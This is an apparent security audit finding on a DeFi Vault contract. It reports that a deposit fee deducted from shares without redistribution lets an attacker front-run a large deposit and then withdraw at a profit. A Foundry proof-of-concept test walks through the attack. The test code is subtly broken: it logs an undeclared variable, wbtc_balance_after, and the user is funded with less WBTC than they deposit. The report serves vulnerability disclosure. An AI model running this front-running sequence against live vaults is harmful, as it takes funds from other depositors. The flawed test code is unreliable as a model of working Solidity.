# Attacker can get profit by front-run in `Vault`.

### Summary

The `deposit` function does not allocate the `depositFee` to a designated fee recipient. Instead, the fee is simply deducted from the user's minted shares, resulting in a slightly lower share issuance. 
This design choice can cause a front-running scenario where an attacker deposits a large fund just before a significantly larger deposit. The attacker can then immediately withdraw, profiting from the increased share-to-collateral ratio.  

### Root Cause

The [`depositFee`](https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Vault.sol#L61) is deducted from the user's minted shares, but these shares are not redistributed.
Because of this, each share is backed by more collateral than before.

### Internal Pre-conditions

`depositFee` is set.

### External Pre-conditions

Public mempool-owned Chain such as Base, Optimism, Arbitrum

### Attack Path

1. There are spam deposits and withdraws and to prevent this, owner sets `depositFee`.
2. Attacker monitors the mempool for a large deposit transaction.
3. Attacker deposits some fund before large deposit.
4. Large deposits happens.
5. Attacker withdraws with profit.


### Impact

Attacker gets profit and user who made large deposit gets loss.

    function setUp() public virtual {
        vm.startPrank(owner);
        vault = address(new Vault(address(wbtc), address(usdc)));
        strategy = address(new Strategy(address(pool), address(vault), rebalancer, feeRecipient));
        IVault(vault).setStrategy(strategy);
        Vault(vault).setDepositFee(10);

        deal(address(wbtc), user, 1e8);

        IStrategy(strategy).rebalance();

        vm.startPrank(depositor);
        wbtc.approve(vault, type(uint256).max);
        usdc.approve(vault, type(uint256).max);

        vm.stopPrank();
    }

    function test_audit() public {
        
        uint256 amount0 = 10e8;
        uint256 amount1 = 1000_000e6;

        deal(address(wbtc), attacker, amount0);
        deal(address(usdc), attacker, amount1);

        uint256 wbtc_balance_before = wbtc.balanceOf(attacker);
        uint256 usdc_balance_before = usdc.balanceOf(attacker);

        // attacker does front-running deposit before user deposits
        vm.startPrank(attacker);
        wbtc.approve(vault, type(uint256).max);
        usdc.approve(vault, type(uint256).max);
        (uint256 shares,,) = IVault(vault).deposit(amount0, amount1, 0, 0);

        deal(address(usdc), user, amount1); 
        vm.startPrank(user);
        IVault(vault).deposit(amount0, amount1, 0, 0);
        vm.stopPrank();

        // after user deposits, attacker does withdraw all shares
        vm.startPrank(attacker);
        IVault(vault).withdraw(shares, 0, 0);
        vm.stopPrank();

        // attacker's balance increases

        uint256 usdc_balance_after = usdc.balanceOf(attacker);
        
        console.log("wbtc increase: ", wbtc_balance_after - wbtc_balance_before);
        console.log("usdc increase: ", usdc_balance_after - usdc_balance_before);
        
    }

### Mitigation

Redistribute the deposit fee: Instead of simply deducting it from the shares, transfer the corresponding tokens to a fee recipient.
Or introduce another method to prevent spam deposits.
